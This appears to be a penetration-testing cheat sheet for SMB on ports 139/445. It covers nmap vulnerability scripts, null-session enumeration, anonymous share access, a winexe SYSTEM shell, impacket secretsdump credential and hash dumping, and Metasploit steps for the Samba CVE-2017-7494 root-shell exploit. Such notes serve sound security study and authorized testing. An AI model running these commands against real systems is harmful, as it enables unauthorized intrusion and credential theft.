# Port 139/445 SMB

Basics:
https://www.youtube.com/watch?v=4_QXSIF16lw
Security:
https://www.youtube.com/watch?v=DsSEknNGOr8&list=PLyOlunpO5LG1W1SgFGDUAlCTSz9j9zBax&index=3

## Enumeration
Application:
Version:
Domain/workgroup name:
Domain-sid:
Allows unauthenticated login:

- ### nmap script scan

	  nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445

- **scripts**
  
    smb-brute.nse
    smb-double-pulsar-backdoor.nse
	smb-enum-domains.nse
	smb-enum-groups.nse
	smb-enum-processes.nse
	smb-enum-services.nse
	smb-enum-sessions.nse
	smb-enum-shares.nse
	smb-enum-users.nse
	smb-flood.nse
	smb-ls.nse
	smb-mbenum.nse
	smb-os-discovery.nse
	smb-print-text.nse
	smb-protocols.nse
	smb-psexec.nse
	smb-security-mode.nse
	smb-server-stats.nse
	smb-system-info.nse
	smb-vuln-conficker.nse
	smb-vuln-cve-2017-7494.nse
	smb-vuln-cve2009-3103.nse
	smb-vuln-ms06-025.nse
	smb-vuln-ms07-029.nse
	smb-vuln-ms08-067.nse
	smb-vuln-ms10-054.nse
	smb-vuln-ms10-061.nse
	smb-vuln-ms17-010.nse
	smb-vuln-regsvc-dos.nse
	smb2-capabilities.nse
	smb2-security-mode.nse
	smb2-time.nse
	smb2-vuln-uptime.nse
	
- **enum4linux scan**
	https://highon.coffee/blog/enum4linux-cheat-sheet/

	  enum4linux -a <target_address>

- **enum w/ rpcclient guest (port 139)**

	```bash
	# from cli
	rpcclient -U ""
  
	#from rpcclient
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall
	```
- **wineexe log in with shell**
  	winexe -U username // "cmd.exe" --system

- **NTDS.DIT**
  Contains the local Active Directory database where all directories are stored. 

  This file can be lucrative for an attacker because it contains all the Active Directory credentials. 

  Often obtainable if SMB vulnerabilities are present on the system.
  
## smbclient

- List Shares w/ Anonymous Access
    
	  smbclient -N -L \\\\<target_address>\\
    
- Access Share w/ Anonymous Access
    
	  smbclient -N \\\\<target_address>\\<target_share>

- List shares w/ Username/Password Access

	  smbclient -L \\\\<target_address>\\ -U user

- Access Share w/ Username/Password

	  smbclient \\\\<target_address>\\<target_share> -U user

## Lateral Movement with Windows SMB Shares

- The following video explains how an attacker can exploit SMB Admin 
Shares in order to gain access to other systems on the network: 

  https://www.youtube.com/watch?v=41MUhlHGZ4E 

## Get secrets (hashes, plaintext credentials, keys, etc)

- impacket

  /usr/share/doc/python3-impacket/examples/secretsdump.py
  https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b 

	  python3 secretsdump.py [[domain/]username[:password]@]<targetname or address>

  or
  
	  python3 secretsdump.py LOCAL
	  
  What we would be looking for is a misconfigured service that was set as domain admin. From here, we could use those credentials and Impacket’s **crackmapexec.py** script with the option **rid-brute** or **GetADUsers.py** script to query the Domain Controller and obtain all the usernames and hashes on the network. We would then run the script against the list of usernames/hashes to grab as many credentials as possible. 
  
## Download files

- Get
    
    ```bash
	# from smb
    \> get <target_file>
    ```

## Samba

- Get root shell with versions 3.5.0 to 4.6.4, 4.5.10, and 4.4.14: cve-2017-7494
    
  (Step 1. Attacker msfconsole)
    
    ```bash
    #from cli	
    service postgresql start
    sudo msfdb init
    msfconsole
    
    # from metasploit console: msf>
    use exploit/linux/samba/is_known_pipename
    exploit(linux/samba/is_known_pipename)> set rhost <target_address>
    exploit(linux/samba/is_known_pipename)> exploit
    ```
    
  (Step 2. Victim cli)
    
    ```bash
    whoami
    python -c ‘import pty; pty.spawn("/bin/bash")’
    ```